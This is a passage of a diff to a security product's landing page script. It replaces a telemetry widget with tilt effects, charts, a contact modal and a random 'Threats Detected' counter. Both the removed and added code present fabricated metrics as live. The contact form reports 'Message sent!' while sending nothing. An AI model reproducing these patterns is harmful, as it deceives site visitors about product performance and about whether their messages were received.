-    if (window.NodeList && !NodeList.prototype.forEach) {
-      NodeList.prototype.forEach = Array.prototype.forEach;
     }
 
-    initApplication();
-    ModuleLoader.log('Application boot sequence started');
-    moduleLogger.log('app_boot', {});
-  });
-
-  window.addEventListener('beforeunload', () => {
-    appState.cleanup();
-    ModuleLoader.log('Application unloading');
-    moduleLogger.log('app_unload', {});
-  });
-
-  ModuleLoader.log('Elvira Core v3.1 initialized');
-  moduleLogger.log('core_initialized', { version: '3.1' });
-
-  /* Embedded telemetry.js - Telemetry Module for Elvira Genesis-Elvira */
-  function initTelemetry() {
-    const telemetryHud = document.querySelector('.telemetry-hud');
-    if (!telemetryHud) {
-      console.warn('[Telemetry] HUD element not found');
-      return;
+    // 3D Card Tilt Effect
+    function initCardTilt() {
+      document.querySelectorAll('.card').forEach(card => {
+        card.addEventListener('mousemove', (e) => {
+          const rect = card.getBoundingClientRect();
+          const x = e.clientX - rect.left - rect.width / 2;
+          const y = e.clientY - rect.top - rect.height / 2;
+          const rotateX = y / rect.height * 20;
+          const rotateY = -x / rect.width * 20;
+          card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale(1.03)`;
+        });
+        card.addEventListener('mouseleave', () => {
+          card.style.transform = 'perspective(1000px) rotateX(0deg) rotateY(0deg) scale(1)';
+        });
+        card.addEventListener('focus', () => {
+          card.style.transform = 'perspective(1000px) rotateX(0deg) rotateY(0deg) scale(1.03)';
+        });
+        card.addEventListener('blur', () => {
+          card.style.transform = 'perspective(1000px) rotateX(0deg) rotateY(0deg) scale(1)';
+        });
+      });
     }
 
-    const updateTelemetry = () => {
-      const latencyEl = document.getElementById('latency');
-      const eventsEl = document.getElementById('events');
-      const complianceEl = document.getElementById('compliance');
-
-      if (latencyEl) latencyEl.textContent = `${Math.random().toFixed(1)}ms`;
-      if (eventsEl) eventsEl.textContent = `${(Math.random() * 5e6).toFixed(0)}`;
-      if (complianceEl) complianceEl.textContent = '100%';
-    };
-
-    updateTelemetry();
-    const interval = setInterval(updateTelemetry, 5000);
-    window.addEventListener('beforeunload', () => clearInterval(interval));
-
-    console.log('[Telemetry] Initialized');
-  }
-
-  // Expose initTelemetry for core initialization
-  window.initTelemetry = initTelemetry;
-</script>
-<script nonce="nexus2025">
-  document.addEventListener('keydown', (e) => {
-    if (e.target.tagName === 'A' && e.key === 'Enter') {
-      e.target.click();
+    // Threat Simulator
+    function initThreatSimulator() {
+      const counter = document.getElementById('threat-counter');
+      let count = 0;
+      setInterval(() => {
+        count += Math.floor(Math.random() * 5);
+        counter.textContent = `${count} Threats Detected`;
+        anime({
+          targets: counter,
+          scale: [1, 1.1, 1],
+          duration: 500,
+          easing: 'easeInOutQuad'
+        });
+      }, 2000);
     }
-  });
-</script>
+
+    // Analytics Charts
+    function initAnalyticsCharts() {
+      const latencyChart = new Chart(document.getElementById('latency-chart'), {
+        type: 'bar',
+        data: {
+          labels: ['<0.5ms', '0.5-1ms', '1-2ms', '>2ms'],
+          datasets: [{
+            label: 'Threat Detection Latency',
+            data: [60, 35, 4, 1],
+            backgroundColor: 'rgba(107, 226, 235, 0.7)',
+            borderColor: 'rgba(107, 226, 235, 1)',
+            borderWidth: 1
+          }]
+        },
+        options: {
+          responsive: true,
+          plugins: {
+            legend: { display: true, labels: { color: 'var(--fg)' } },
+            title: { display: true, text: 'Threat Detection Latency', color: 'var(--fg)', font: { size: 16 } }
+          },
+          scales: {
+            x: { ticks: { color: 'var(--fg)' }, grid: { color: 'rgba(255, 255, 255, 0.1)' } },
+            y: { ticks: { color: 'var(--fg)' }, grid: { color: 'rgba(255, 255, 255, 0.1)' } }
+          }
+        }
+      });
+
+      const revenueChart = new Chart(document.getElementById('revenue-chart'), {
+        type: 'line',
+        data: {
+          labels: ['2025', '2026', '2027', '2028', '2029'],
+          datasets: [{
+            label: 'Revenue ($M)',
+            data: [5, 15, 30, 60, 100],
+            borderColor: 'rgba(107, 226, 235, 1)',
+            backgroundColor: 'rgba(107, 226, 235, 0.2)',
+            fill: true,
+            tension: 0.4
+          }]
+        },
+        options: {
+          responsive: true,
+          plugins: {
+            legend: { display: true, labels: { color: 'var(--fg)' } },
+            title: { display: true, text: 'Revenue Projections', color: 'var(--fg)', font: { size: 16 } }
+          },
+          scales: {
+            x: { ticks: { color: 'var(--fg)' }, grid: { color: 'rgba(255, 255, 255, 0.1)' } },
+            y: { ticks: { color: 'var(--fg)' }, grid: { color: 'rgba(255, 255, 255, 0.1)' } }
+          }
+        }
+      });
+
+      const complianceChart = new Chart(document.getElementById('compliance-chart'), {
+        type: 'pie',
+        data: {
+          labels: ['GDPR', 'SOC2', 'HIPAA', 'Other'],
+          datasets: [{
+            label: 'Compliance Coverage',
+            data: [30, 30, 30, 10],
+            backgroundColor: [
+              'rgba(107, 226, 235, 0.7)',
+              'rgba(179, 157, 219, 0.7)',
+              'rgba(107, 226, 235, 0.5)',
+              'rgba(179, 157, 219, 0.5)'
+            ],
+            borderColor: 'rgba(255, 255, 255, 0.3)',
+            borderWidth: 1
+          }]
+        },
+        options: {
+          responsive: true,
+          plugins: {
+            legend: { display: true, labels: { color: 'var(--fg)' } },
+            title: { display: true, text: 'Compliance Coverage', color: 'var(--fg)', font: { size: 16 } }
+          }
+        }
+      });
+
+      document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+          document.querySelectorAll('.tab-btn').forEach(b => {
+            b.classList.remove('active');
+            b.setAttribute('aria-selected', 'false');
+          });
+          document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+          btn.classList.add('active');
+          btn.setAttribute('aria-selected', 'true');
+          document.getElementById(btn.dataset.tab).classList.add('active');
+        });
+        btn.addEventListener('keydown', (e) => {
+          if (e.key === 'Enter' || e.key === ' ') {
+            e.preventDefault();
+            btn.click();
+          }
+        });
+      });
+    }
+
+    // Contact Modal
+    function initContactModal() {
+      const modal = document.getElementById('contact-modal');
+      const contactBtn = document.querySelector('.contact-btn');
+      const closeBtn = document.querySelector('.modal-close');
+      const submitBtn = document.querySelector('.modal-submit');
+      const error = document.getElementById('contact-error');
+      const inputs = document.querySelectorAll('#name, #email, #message');
+
+      contactBtn.addEventListener('click', () => {
+        modal.classList.add('active');
+        inputs[0].focus();
+      });
+
+      closeBtn.addEventListener('click', () => {
+        modal.classList.remove('active');
+        error.style.display = 'none';
+        inputs.forEach(input => input.value = '');
+      });
+
+      submitBtn.addEventListener('click', () => {
+        const name = document.getElementById('name').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const message = document.getElementById('message').value.trim();
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+        if (!name || !email || !message || !emailRegex.test(email)) {
+          error.style.display = 'block';
+          return;
+        }
+
+        error.style.display = 'none';
+        anime({
+          targets: '.modal-content',
+          scale: [1, 1.1, 0.7],
+          opacity: [1, 0],
+          duration: 500,
+          easing: 'easeInOutQuad',
+          complete: () => {
+            modal.classList.remove('active');
+            alert('Message sent! We will get back to you soon.');
+            inputs.forEach(input => input.value = '');
+          }
+        });
+      });
+
+      modal.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+          closeBtn.click();
+        }
+      });
+    }
+
+    // Theme Toggle
+    function initThemeToggle() {
+      const toggle = document.querySelector('.theme-toggle');
+      toggle.addEventListener('click', () => {
+        const currentTheme = document.body.dataset.theme;
+        document.body.dataset.theme = currentTheme === 'dark' ? 'light' : 'dark';
+        anime({
+          targets: 'body',
+          backgroundColor: document.body.dataset.theme === 'dark' ? '#0c0d10' : '#e0e3f4',
+          duration: 500,
+          easing: 'easeInOutQuad'
+        });
+      });
+    }
+
+    // Initialize Components
+    document.addEventListener('DOMContentLoaded', () => {
+      initTosModal();
+      initWebGLBackground();
+      initScrollAnimations();
+      initScrollSpy();
+      initSmoothScroll();
+      initCardTilt();
+      initThreatSimulator();
+      initAnalyticsCharts();
+      initContactModal();
+      initThemeToggle();
+    });
+  </script>
 </body>
 </html>
